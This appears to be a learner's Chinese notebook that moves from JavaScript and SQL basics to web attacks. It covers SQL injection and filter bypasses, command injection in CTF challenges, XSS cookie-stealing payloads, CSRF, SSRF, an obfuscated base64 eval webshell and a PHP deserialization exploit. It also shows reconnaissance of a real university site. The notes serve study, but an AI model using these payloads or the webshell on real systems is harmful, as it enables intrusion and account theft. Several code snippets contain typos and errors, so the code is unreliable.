## JS 基础

#### JS是一门弱类型语言，解释性的语言，它是可以直接被浏览器所解释的，它不需要像C语言一样，声明它的类型。

## 变量

* **<input type= "button”  onclick="alert('按钮') "   value=" 按钮">    按钮button ， on cilck  是被单击的意思**
* **外链式**

```
//声明变量
var num;		//声明一个名称为 num 的变量，此时的值为  Undefined（未被定义的）
num=10;			//给 num 赋值 
num="123";		//给 num 赋予字符串的值
num=true;		//给 num 赋予布尔的值
num=null;		//给 num 赋值为 null
//声明变量并赋值，称为变量初始化
var num=10;

console.log(num) 		//打印
```

##  类型转换

```
 var num=10;
 num.toString()					//将 num 作为转为String类型
 String(num)					//将 num 转为String类型
 
 parsInt(String)				//String类型转int
 parseFloat(String)				//转float
```

## 运算符

####  表达式：由数字、运算符和变量组成的式子

#### 返回值：每个表达式经过运算后都有相应的返回值

##     算术运算 符

#### 算术表达式的返回值都是数值型

```
var a=10,b=10,c;
c=a+b;			//加法运算符
c=a-b;			//减法
c=a/b;			//除法
c=a*b;			//乘法
c=a%b;			//取余数
```

##  逻辑运算符

####  逻辑表达式的返回值都是布尔型

```
//与运算(&&) 有false即false
true && true			//返回值为true
true && false			//返回值为false	

//或运算(||) 有true即 true
true || true			//返回值为true
true || true			//返回值为true

//非运算，取反
!true 				//返回值为false
```

## 流程控制

####   if  语句：可以说是如果，它会将所返回的一个值进行一个判断

```
//  1.  条件成立执行的代码语句
	if (条件表达式) {
	}
	
//  2. if else 语句
	if (条件表达式) {			//如果条件成立执行的代码
	} else {
	
// 否则执行的代码
	}

//  3. if else if 语句 （多分支语句） 
//  适合检查多重条件
	if (条件表达式1) {
		语句1;
	} else if（条件表达式2） {
		语句2;
	} else if（条件表达式3） {
		语句3;
	} else {
// 上述条件都不成立执行此处代码
	}                                               
//三目运算符 ：？ true ： false  
if (true || false) { alert("我爱潘艺华，潘艺华是我的大宝贝")}  ben'di
```

#### switch 语句 ：

```
switch (表达式) {
	case value1:
	// 表达式 等于 value1 时要执行的代码
		break;
	case value2:
	// 表达式 等于value2 时要执行的代码
		break;
	//如果没有break 就会全部执行，因为它没有跳出这个函数
	default:
	// 表达式 不等于任何一个 value 时要执行的代码
}
	//如果上面的cash 都找不到就直接执行default
```

#### for 循环 : 

```
for(初始化变量； 条件表达式； 操作表达式){
	//循环体代码
}

如：
for(var i=0 ; i < 10 ; i++){
	console.log(i);
}
```

#### while 循环 ：

```
while (条件表达式){
	//循环体代码
}

如：
var i = 0
while(i < 100 ){
	console.log(i);
	i++;
}
	//加i++ 是为了跳出这个100的循环
```

#### 九九乘法 (for 循环)

```
var str = "";
  for (var i =1; i <= 9; i++) {
  	for (var j= 1; j <=1; j++) {
  		str += j + "x" + i + "=" + j * i + "\t";
  	}
  	str += "\n";
  }
  console.log(str);
```

#### 1-100 累加和（while）:

```
//计算 1-100 的累加和：
	var i =1;
	var sum =0;
	while(i <= 100) {
		sum += i;
		i++;
	}
	console.log(sum);
```

## 函数

#### 函数就是将我们这一块代码进行一个封装，封装好后方便我们去调用。

```
1 . 通过function 关键字来定义函数 -- 命名为函数
	function 函数名() {
	//函数体代码
	}
如：
function print_(){
	console.log('123')
}
print_()

2 . 通过函数表达式来定义函数  --匿名函数
	var fn = function() {
	}
	
3 . 调用函数
	函数名();  		//需要先声明函数，才可调用
	变量名();			//调用存储在变量中的匿名函数
	
4 . 函数的参数
	//带参数的函数声明
	function 函数名(形参1，形参2，形参3···) {
	//函数体  
	}
	//带参数的函数调用
	函数名(实参1，实参2，实参3···);
	function login(username,password){
	} 
如：
	function login(username,password){
		if(uesrname='123' && password='123'){
			alert("登陆成功");
		}
	}
	login('123','123');
	 
传参 比如：
function print_(str){
	console.log(str)
}
print_("你好，web安全")

5 . 多个参数
//如果函数调用的参数太多（超过声明），则可以使用 arguments 对象来达到这些参数。
	x = sumAll(1, 123, 500, 115, 44, 88);
	function sumAll() {
		var i, sum = 0;
		for (i = 0; i < arguments.length; i++) {
			sum += arguments[i];
		}
		return sum;
}
```

## 数组

```
//定义数组
var arrStus = [1,2,'123'];

//获取数组中的第二个元素

alert(arrStus[1]);

//如果访问数组时没有和索引值对应的元素(数组越界)，
//返回值为undefined
```

## DOM

#### JS 可以动态的更改HTML

#### 更改HTML标签内容

```
<html>
<body>
	<p id="p1">Hello world!</p>
	<script>
		document.getElementById("p1").innerHTML="New text!";
	</script>
	<p>上面的段落被一条 Javascript 脚本修改了。</p>
</body>
</html>
```

#### 更改HTML标签属性

```
<html>
<body>
	<p id="p1">Hello world!</p>
	<script>
		document.getElementById("p1")。id="p2";
		x=document.getElementById("p2").id;
		document.write(x)
	</script>
	<p>上面的段落被一条 Javascript 脚本修改了。</p>
</body>
</html>
```

## 事件

![image-20230918102906985](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918102906985.webp) 

## 表单校验

#### JavaScript 可用来在数据被送往服务器前对 HTML 表单中的这些输入数据进行验证。

#### 表单数据经常需要使用 JavaScript 来验证其正确性：

- **验证表单数据是否为空？**
- **验证输入是否是一个正确的email地址？**
- **验证日期是否输入正确？**
- **验证表单输入内容是否为数字型？**

```
<form METHOD=POST ACTION="">
	<input type="password" id="input1">
	<input type="password" id="input2">
	<input type="button" value="test" onclick="check()">
</form>
<script>
	function check() {
	if(document.getElementById("input1").value/=document.getElementById("input2").value)
{
	alert("两次密码不一样")
	input1.value = "";
	input2.value = "";
}
	else document.forms[0].submit();
}
</script>    
</body>
</html>
```

#### 校验

![image-20230918103627169](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918103627169.webp) 



## JQuery

* **jQuery 是一个js库**
* **jQuery 极大的简化了js编程**
* **jQuery 很容易学习**

## 导入 JQuery 包

```
<script src-"jquery.js"></script>
```

## JQuery-ajax

#### ajax 请求接口，返回 json 消息

#### 响应消息的编码也必须是json 编码的才可以 （Content-type：text/json）

![image-20230918113131522](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918113131522.webp)  

![image-20230918151303135](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918151303135.webp) 

## JSON

#### JSON ：JavaScriptObject Notation （对象表示法）

![image-20230918152139878](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918152139878.webp) 

```
var json_1 = {"name":"taoeyhuang","age":18};
# 键值对  
```



## 数据库

#### 创建数据表

![image-20230918171257847](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918171257847.webp) 

#### 增加或插入数据：

* **insert  into  表名（字段名，字段名） values（值）；**
* **insert  into  表名  values（值，值）；**

![image-20230918171532780](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918171532780.webp) 

#### 查询数据

* **select *  from 表名**
* **select  id from 表名**

 ![image-20230918172311210](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918172311210.webp) 

#### 条件语句查询

* **select  *  from  表名 where id=10；**
* **select  *  from 表名  where  id=10  and  name='小明'；** 

![image-20230918172507087](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918172507087.webp) 

#### 修改语句

* **update   表名 set  字段=值， 字段=值  where 条件**
* **update  user set  name='小明', sex='男'  where id = 4；**



#### ![image-20230918174038933](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918174038933.webp)

#### 删除数据 

![](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918174637188.webp) 

* **delete  from 表名  where  条件**
* **delete  from user  where  id=4；**

![image-20230918174637188](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918174637188.webp) 

#### 对查询结果排序（ordey  by）

* **select  *   from  stu order  by  stu_id   字段**

![image-20230918223946384](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918223946384.webp) 

#### 对查询结果分组

![image-20230918224458134](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918224458134.webp) 

#### 限制查询数量

* **select  *  from  stu  limit 3  （只回显前三条数据）**  

![image-20230918224714735](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918224714735.webp) 

* **select  *  from  stu  limit  2， 5（从第三条数据开始检索出5条数据）**

![image-20230918224950052](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918224950052.webp) 

#### 条件查询过滤

![image-20230918225247875](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918225247875.webp) 

* **select *  from stu  where id in (8,2,5,4)   后面的字段随便写**

![image-20230918225326780](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918225326780.webp) 

#### 模糊查询

![image-20230918225708345](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918225708345.webp) 

## 联合查询

* **union 操作符： 就是说可以在前面这个查询的一个基础上 加上select拼接起来联合查询**
* **联合查询是要通过 order by 去判断它的一个字段是多少个，然后后面加上select 它的一个查询字段**
* **select  * from stu union select** 
* **联合查询有两个限制：① 两个查询的字段数量必须是一样的 ② 编码类型必须是一样的（编码不一样是不可以查询的）**
* **编码类型有两种 ①utf-8  ② gbk**

![image-20230918225836277](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918225836277.webp)  

```
select * from stu  union select user_id,user,password,4 from dvwa.users (库名加表名)
```

* **information_scheama 系统自带的数据库 （每一个mysql数据库里面都会 有这个系统数据库 mysql5版本以上才有的）**
* **数据库**
* **表名**
* **字段名**

```
select column_name from information_schema.columns where table_schema = 'dvwa' and table_name ='users'
```







## 网络空间

### FOFA

* **URL   : [fofa](https://fofa.info/)**

### 鹰图

*  **URL   :  [鹰图平台 ](https://hunter.qianxin.com/)**

## 网站信息

### IP地址归属

* **URL ：[IP查询 ](http://www.cip.cc/)**

## fscan

**URL  : [fscan](https://github.com/shadow1ng/fscan)**

* **一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。**





## 搜索资源的命令

```php
domain="xmist.edu.cn"
```

**`body`:在它的一个网页代码里面有包含哪些内容**

**如：**

```php
body="/en/student/apply/index"
```

## 敏感信息泄露

**在 `url `后添加一个`uploads`**

```php+HTML
https://www.xmist.edu.cn/uploads/
```

## CNVD证书

#### 事件型

* **必须是高危的  (重要机构)**
* **通用型**

#### POC : (漏洞检测工具)

#### EXP : (漏洞的利用工具)

## 正则表达式

* **[-] 字符范围。匹配指定范围内的任意字符。如： '[a-z]' 可以匹配 'a' 到'z' 范围内的任意小写字母字符****
* **`/` 表示正则表达式的开始，再一个`/` 表示结束**、
* **在结束的`/`后面跟上的为定界符**
* **`i` 表示在和模式进行匹配进不区分大小写**
* **`S`  如果没有使用这个模式修正符号，元字符中的`"."` 默认不能表示换行符号，将串视为单行**

## **单引号逃逸**

* **注释符被过滤**

```sql
SELECT * FROM user WHERE id='$id' LIMIT 0，1

1’ and '1'='1'
```

#### 其他用法

* **&& ： 在`url` 代表参数之间的一个分隔   (但是不能直接输入，要转成url码才可以使用)**  `%26`

```sql
or 和 and 被过滤
||     &&
%7c    %26
```

## 空格绕过

* **如果在尝试注入过程中，发现空格被空格过滤，那么就可以去尝试括号是否被过滤，如果括号未被过滤，那么就可以尝试括号来进行绕过。**
* **因为在mysql中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，多可以用括号包围起来。儿括号的两端可以没有多余的空格**
* **`/**/ ` : 多行注释**

```sql
# 对字段、表名进行包裹，无法对关键字进行包裹
SELECT(name)from(user)where(1=1)and(2=2)

空格被过滤
/**/
select/**/from
%09
```

## 大小绕过

* **在正则匹配中，`select` 和`union` 没有加上 `/i` 是区分大小写匹配的，那就可以通过大小写绕过，如Select 、Union**
* **因为这个正则将匹配的字符直接转为空的，那就可以通过双写绕过。如：selectselect , 当中间的 select 被匹配到就变成空了，那这个字符就变成select**

如：

![image-20231011172034848](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231011172034848.webp)

## 宽字节绕过

如 ：`id=1%df%27/**/order/**?by/**/3%20 --+`

![image-20231011172219239](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231011172219239.webp)  

```sql
%df%26  --> gbk
'\''

select * from user where user_id = '1 *' and *''
```

## 逻辑缺陷

* **水平越权**

* **垂直越权  (低权限如果想要越权高权限 是需要一个接口来)**

```sql
site:hunau.edu.cn.intext:学号
//site:域名。
返回域名中所有的URL地址，它可以探测网站的拓扑结构进行，也是非常的重要，使用非常频繁。比如搜索北京大学所有学院的URL地址，我们输入“学院 site:pku.edu.cn”就可以搜索到它所有的学院
```

## 使用谷歌语法进行搜索

* **在国内由于各种限制导致很多信息都无法直接获取，而谷歌搜索引擎又十分强大，使用独特的谷歌搜索引擎往往可以帮我们收集到一些意想不到的信息。**
* **谷歌搜索引擎在国内无法直接进行访问。但是谷歌也有在中国做有镜像网站，以下为谷歌镜像网站链接**

**1.[s.iit.xyz](https://s.iit.xyz/)**

**2.[note.cm](https://note.cm/)**

**3.[Google](https://www.google.com/)**

#### **谷歌搜索语法命令：**

* **inurl:.edu.cn 统一身份验证**

```
site:指定域名

filetype:指定文件类型

inurl:指定url

intitle:指定title元素内的内容搜索

intext:把网页正文中某个关键字做为搜索条件，然后搜索全世界网页正文中含有这些关键字的网页,allintext：关键字功能相同。

info:这个语法用于搜索指定站点的一些基本信息。比如搜索北京大学网站的一些信息
```

![20200428172116300](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/20200428172116300.webp) 

![20200428172122181](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/20200428172122181.webp) 

**如果想了解更多的语法就移步到[谷歌搜索引擎使用语法大全收集_谷歌语法怎么找cms-CSDN博客](https://blog.csdn.net/xxx0028/article/details/105818546)这篇文章**

## 文件操作

#### 文件上传

* **php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门**
* **有时可以使用 `../` 来将文件上传到其他目录，达到一个利用的效果。**

```
1 : 服务器脚本语言为PHP
2 : 服务器使用CGI/ FastCGL 模式
3 : 上传目录下要有可执行的PHP文件
```

```php  
eval : 执行代码函数
system : 执行外部程序，并且显示输出
<?php phpinfo();?>
```

#### 文件包含

* **如果是以文本的形式它会直接输出，如果是代码的形式就直接执行**
* **include  ：(语句包含并运行指定文件)**

![image-20231012180659200](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231012180659200.webp)  

```php
//如果想看代码的内容就可以用相关的一个协议

php://filter/read=convert.base64-encode/resource=index.php
//php伪协议，以base64编码输出

<?php
?>
```



## RCE漏洞（远程命令/代码执行）

* **system()** 
* **passthru()**
* **exec()**
* **shell_exec()**
* **popen()**
* **proc_open()**
* **pcntl_exec()**

#### Web 混淆

```PHP
<?php
    $a=$_GET['x'];		//可以用动态传参 用变量的值来作为我们的变量名
	$$a=$_GET['y'];
	$b($_POST['z']);

	$a = 'b';
	$$a = 'eval';
	$b = 'eval';
	$eval('')
?>
```

#### Web 类混淆

```php
<?php
class x
{
	public $payload = null;
    public $decode_payload = null;
    function _cocnstruct()			//初始化模式
    {		$this->payload='ZXZhbCgkx1BPU1RbYV0pOw==';
     		$this->decode_payload = @base64_decode( $this->payload );
     		@eval("/*sasas23123*/".$this->decode_payload."/*sdfw3123*/");
        
    }
}
nwew x();
?>
```

###  URl绕过

#### **先分析代码**

* **源码中出现`eval($_GET[‘url’])`说明可以使用GET方式以 `url`为参进行传值。**
  **``eval`函数可以将传入的代码当做命令执行；则传入`?url=system('ls /');``**

![image-20231019112722999](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019112722999.webp) 

**查看根目录下的文件，发现一个``flllllaaaaaaggggggg`文件；再传入`?url=system(“cat /flllllaaaaaaggggggg”);``查看文件，文件中有flag。**

![image-20231019113014675](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019113014675.webp) 



#### Linux 命令中的空格绕过

* **绕过空格过滤****

　　**1.`${IFS}`绕过**

　　**`$IFS{}`是shell的特殊环境变量,是Linux下的内部区域分隔符。$IFS中存储的值可以使空格、制表符、换行符或者其他自定义符号**。**

　　**2.`$IFS$9`绕过**

```
?url=ls   ：把当前目录并列出来

?url=ls${IFS}/	:查看当前文件的根目录

tab 也是一个空格 ，它转义后是%09
```

　**3.制表符绕过**　

* **tab :  %09是制表符的URL编码,可以通过%09来代替空格，绕过空格过滤**

#### **这里以ctfer中的一个靶场为例：  [SWPUCTF 2021 新生赛babyrce](http://node5.anna.nssctf.cn:28233/)**

**题目描述：**

![image-20231019103541823](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019103541823.webp)

**点进去可以看到代码中的要求就是`cookie[admin]=1`，如果是将得到一个新的文件，如果不是则输出"echo"的内容**

**打开bp抓包 在里面添加`cookie:admin=1`** **放包** **，查看返回值**

![](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019101702064.webp)  

**可以看到得到一个新的文件` rasalghul.php`**

![image-20231019104941119](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019104941119.webp) 

**将文件与url拼接起来，得到新的代码。代码提示我们GET要输入url**

![image-20231019105414006](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019105414006.webp) 

**再仔细看可以发现是空格绕过， 是用户传入的`url`变量会被`shell_ecec`执行，通过前面的`url`**

**绕过 用``ls`命令来把当前目录列出来得到目录下的flag文件**

![image-20231019105843861](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019105843861.webp) 

**再用`cat`命令来打开，就可以拿到flag了**

![image-20231019110250455](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019110250455.webp) 

#### 在php中能执行系统命令的关键字 

* **列如：[这都不会，还想web入门？？？？](http://node5.anna.nssctf.cn:28640/)**
* **先找出没有被过滤的 可以看到反引号没有被过滤** 
* **函数?code=print(`l's'`);**
* **?code=print(`ca\\t /fffffffffflagafag`);**

​        

## XSS 漏洞

- **XSS(前端代码注入)**
- **XSS(跨站脚本漏洞)**

#### 前端代码（开源）三块

1. **HTML：网页的框架**
2. **CSS：把网站变得更加好看**
3. **Javascript：让网页功能更强大**

```
对于攻击者而言CSS并不重要，因为他只是美化界面，并没有安全效果

攻击的方向是js和如何触发js。因为js很强大，它可以控制浏览器
```

- **`document.cookie="id"`(设置浏览器Cookie的js代码)**
- **偷偷发送数据包(异步传输)**
- **它可以窃取Cookie (先读取你的Cookie然后偷偷发送数据包给黑客，黑客收到Cookie后就可以登录你的账户)**

```
拿到Cookie不等于拿到密码。（Cookie授权是有时效的）Cookie本身是不安全的，但是为了便捷并且利大于弊的情况下就选择了Cookie
```

**Js的标识：**

```js
<script>alert(1)</script> // 设置了一个js弹窗

<a href=javascript:alert(1)> // 伪协议触发

<img src=1 onerror=alert(1) /> // 事件方法（触发器：事件在标签里面on开头的东西很高概率是事件）触发条件是src=1，因为这个本身不成立所以执行了后面的语句
```

**在实战中不建议使用 `alert()` 这个函数进行弹窗，会影响业务正常运行属于风险操作**

> **使用以下示例**

```html
<script>console.log(123)</script>
```

**上面三个不仅仅是js的标识还是触发的方法**

[JavaScript事件触发手册(opens new window)](https://blog.csdn.net/qq_36354324/article/details/106592588)

```
有的时候是缓存问题导致无法弹窗CTRL+F5就行了

事件功能非常强大，甚至可以监听键盘鼠标，左键右键，屏幕。
```

**弹出网站cookie**

```js
<script>alert(document.cookie)</script> // 设置了一个js弹窗

<a href=javascript:alert(document.cookie)> // 伪协议触发

<img src=1 onerror=alert(document.cookie) /> // 事件方法（触发器：事件在标签里面on开头的东西很高概率是事件）触发条件是src=1，因为这个本身不成立所以执行了后面的语句
```

#### XSS分为三种类型：反射型  、DOM型 、存储型

- **反射型：  反射型  （就是将我们输入的内容回显到当前页面）打印在控制台  。你给我传参，然后触发了Js，如果你不给我传参，就不存在(传参里必须包含恶意语句才是标准的反射性XSS语句)  测试：`<scripts>console.log(123)</script>`** 
- **存储型：**   **它是将我们写入的一个内容直接写在数据库里面存储下来的传参，不需要传参中必须有恶意语句。但这样的脚本会被存进数据库，在这之后的所有人在访问这个网站的时候都有可能会执行你写的xss脚本(只要他存储在目标服务器)**    

* **存储型的xss脚本的功能是十分强大的，如果有人在网站的数据库里打入了一个存储型的xss脚本，并且它会获取每个用户的Cookie，那么他就会有盗号等一系列的风险**

#### 反射性的xss要点击才会中招

* **`http://www.xxx.com/?a=<script>alert(1)</script>`这就是一个反射性xss脚本，正常人看见都觉得肯定有问题，所以就可以引入一个东西****

```
叫做短链接，原理很简单，在百度随便一搜就大把多。可以把长链接压缩成短链接，这样就可以引导别人点击。

在实际网站中也会遇见尖括号被编码掉了导致无法注入

前端代码有一个很重要的东西是兼容性。会对一些东西进行包容
```

**JavaScript还支持一些编码例如：NATIVE**

**弹窗函数被劫栏会尝试替代`prompt(1)`**

```
payload: 'onfocus=alert(1)autofocus' 当input输入框获取焦点时执行(onfocus)
```

## [#](https://joker123op.github.io/blog2/handbook/xss.html#cookie同源策略)Cookie同源策略

**浏览器的同源策略，限制了不同源的JS，对当前页面的资源和属性的权限。同源策略保护了a.com域名下的资源不被来自其他网页的脚本读取或篡改**

**所谓同源是：需要同域名/端口、**协议

**比如 `http://www.baidu.com`    就不是同源的   Js偷Cookie就是读取本地的Cookie发送到我准备好的目标服务器上**

```
https://www.baidu.com
```

#### [XSS平台 (opens new window)](https://xssaq.com/)域名做越短越好

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304181445728.webp) 

**如果只是窃取Cookie勾选这两个就已经够了**

**给网站添加cookie或者更改的插件是`EditThisCookie`下载地址放这里了[跳转(opens new window)](https://github.com/ETCExtensions/Edit-This-Cookie/releases/tag/1.5.0)**

#### 存储型XSS会出现的地方：

- **任何可能插入数据库的地方**
- **用户注册的时候**
- **留言板**
- **上传文件的文件名**
- **（管理员可见的）报错信息**

```
一般情况下来说前台的防御是高于后台的
```

#### 存储型xss：

1. **同源法则**
2. **XSS平台**
3. **存储型XSS并不是非得存数据库**
4. **XSS可以见框就插**

## [#](https://joker123op.github.io/blog2/handbook/xss.html#dom-based-xss)Dom Based XSS

* **Dom是一个Js可以操控浏览器和网页的接口**

```
Dom不会经过服务器，本质上是自己打自己，因为每次有用户访问网站都会需要服务器对他分配一定资源，如果是有100万人同时访问，甚至更多。就会导致服务器压力过大。

所以这个时候就需要经过用户自己的本地，可以一定程度上给服务器减轻一部分压力，所以产生了漏洞

每个载入浏览器的HTML文档都会成为Document对象。

Document对象使我们可以从脚本中对HTML页面中的所有元素进行访问。
```

**Document的对象属性**

| 属性         | 描述                                                         |
| ------------ | ------------------------------------------------------------ |
| body         | 提供对`<body>`元素的直接访问。对于定义了框架集的文档，该属性引用最外层的`<frameset>` |
| cookie       | 设置或返回与当前文档有关的所有cookie                         |
| domain       | 返回当前文档的域名                                           |
| lastModified | 返回文档被修改的最后日期和时间。                             |
| referrer     | 返回载入当前文档的文档url。                                  |
| title        | 返回当前文档的标题。                                         |
| URL          | 返回当前文档的URL，                                          |

**这是上述函数的使用方法**

| 函数                  | 作用                                                         |
| --------------------- | ------------------------------------------------------------ |
| document.body         | 提取Body信息                                                 |
| document.domain       | 提取当前页面域名                                             |
| document.lastModified | 查看当前页面的最后修改时间（同时也可以查看网站是否是静态网站） |

**详细内容可以看看这篇扩展文章[Dom Based XSS(opens new window)](https://blog.csdn.net/weixin_45634365/article/details/114536958)**

**在真是网络环境中，还会存在一些伪静态网页，他们本质上还是动态。一样可以进行SQL注入。判断方法是使用函数`document.lastModified`来查看**

**要依靠当前页面JS才能触发的漏洞，可以理解为dom型xss**

## CSRF(客户端跨站请求伪造)

* **CSRF跨站请求伪造：也被称为“One Click Attack”或者Seccion Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(xss)，但是他和xss非常不同，xss利用站点内的信任用户，而CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比xss更具危险性**

* **CSRF漏洞的成因是因为网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的CSRF脚本或者包含CSRF脚本的链接，可能会执行一些用户不想做的功能(比如是添加账号等)**

**CSRF和XSS没有直接关系**

```
XSS：在目标网页上执行JS来窃取Cookie

CSRF：危害很大，但是条件需要配合
```

- **1、恰好登陆**
- **2、好登陆了**

**生成一个CSRF攻击的html文件很简单，先在自己需要强制发送的数据包进行自己修改一下，再使用burpsutie进行抓包，然后右键**

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304201602036.webp) 

**然后就会会生成一个html，把他保存下来就可以形成一个可以攻击的恶意CSRF**

![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304201603487.webp) 

## SSRF （服务端请求伪造）

* **（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)**

* **攻击者能够利用目标帮助攻击者访问其他想要攻击的目标**

* **SSRF可以使用A网站进行对B网站的攻击 **   **`公网和内网`**

#### **安全意识现状：**

- **外紧内松**
- **做安全是花钱的**

**一般情况下对内网都是处于一个比较信任的状态，很少会做一些防护，甚至有的是弱密码**

**其核心就是利用外网来进行内网渗透而不是防止溯源**

```
SSRF控制目标服务器发起网络请求

CSRF控制用户的浏览器发起网络请求
```

**访问网站协议有很多：**

```text
http://

file:///        直接读取文件

dict://url:端口号         探测端口
```

**SSRF =>**

- **可以作为跳板**
- **可以攻击内网的网站**
- **可以攻击内网的服务（其实可以拿内网的服务器）**

**传参后面出现某些东西是很危险的**

* **协议：http:// 任意其他协议都可以试试SSRF**

* **出现文件名：a.txt => b.php(x.后缀)**

## 反序列化漏洞

* **在我们程序之间进行数据传输的时候，想把这个变量传给另外一个系统**
* **序列化和反序列化 就是如果在两个程序进行一个交互，把这个变量传到另一个程序去。**
* **序列化就是将一个变量序列化完将它传到另一个程序，让这个程序再对它进行一个反序列化，就得到原来的**



![image-20231026110934046](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231026110934046.webp)   



#### **序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名**。反序列化则相反将字符串重新恢复成对象**。**

|   类型   |        过程         |
| :------: | :-----------------: |
|  序列化  | 对象   -->   字符串 |
| 反序列化 |  字符串 --->  对象  |

#### 访问控制修饰符

```
public(公有) 
protected(受保护)     // %00*%00属性名
private(私有的)       // %00类名%00属性名
```

**protected属性被序列化的时候属性值会变成 `%00\*%00属性名`**
**private属性被序列化的时候属性值会变成 `%00类名%00属性名`**

**%00为空白符，空字符也有长度，一个空字符长度为 1**

#### 序列的含义

**例如：` O:4:"user":2:{s:3:"age";i:18;s:4:"name";s:3:"LEO";}   `   `O`代表对象：**

**序列化的操作：**

```php
<?php

    $id = '123';
 // echo serialize($id);

// 加上对象的时候
	class stu{
        var $name='123';
        var $sex = FALSE;
    }
   
//反序列化的时候用这个
   echo unserialize($_GET['s']);
   
   if($id = 123){
   	echo 'ok';
   }

?>
```

#### 魔术方法

* **魔术方法是语言中保留的方法名，各个方法会在对应操作时自动调用，以PHP语言中的魔术方法来做讲解**

![image-20231030163542868](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231030163542868.webp) 

```php
<?php
 class stu{
        var $name='ipconfig';
        var $sex = FALSE;

        function _construct(){
            echo "construct";
        }
    
        function _destruct(){
            system($this->name);

        }
    
    }
    
    unserialize($_GET['s']);

?>
```

  

**以下是一个题目[SWPUCTF 2022 新生赛  1z_unserialize](http://node5.anna.nssctf.cn:28458/)**

**题目给出了php代码**

```php
<?php
class lyh{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
     
     function  __destruct()
     {
        $a = $this->lt;
        $a($this->lly);
     }
    
}
unserialize($_POST['nss']);
highlight_file(__FILE__);
 
?> 
```

* **`__destruct `** **在php魔术方法中的析构函数 ，它的意思是 摧毁，毁坏。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。**
* **`unserialize($_POST[‘nss’]);`******在执行完成后，通过 unserialize 重新创建的对象没有被任何变量引用，因此它将会被标记为不再需要，并最终会被 PHP 垃圾回收机制销毁。在对象被销毁的时候，__destruct 方法会被自动调用******。

#### **题目代码给了php中特有的动态函数**

```
// 这一行代码将 $this->lt 属性的值赋给变量 $a。因此，变量 $a 现在包含了一个可调用的函数或方法的引用。
$a = $this->lt;


// 在这一行代码中，变量 $a 被当作一个函数或方法来调用，同时传递 $this->lly 作为参数。这意味着 $this->lt 的值应该是一个函数或方法，而 $this->lly 被传递给这个函数或方法作为参数。 

$a($this->lly);

① 就相当于    $this->lt($this->lly);//很像命令执行 函数+指令
```

**所以我们可以通过构造一个恶意的序列化对象，将自定义的函数传递给 `$lt `属性，然后将要执行的代码（或者指向一个恶意代码文件的路径）传递给 `$lly` 属性。当对象被序列化后再被反序列化时，`__destruct `方法会被自动调用，从而执行指定的恶意操作。**

#### 源码：

```php
<?php
highlight_file(__FILE__);
class lyh{
    public $url = 'NSSCTF.com';
    public $lt='system';
    public $lly='whoami';
     
     function  __destruct()
     {
        $a = $this->lt;
        $a ($this->lly);
     }
}
    echo serialize(new lyh);

?>
```

**返回一串被反序列化后的值**

![image-20231101162629877](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231101162629877.webp) **又题目给出 ，通过``POST``传参**

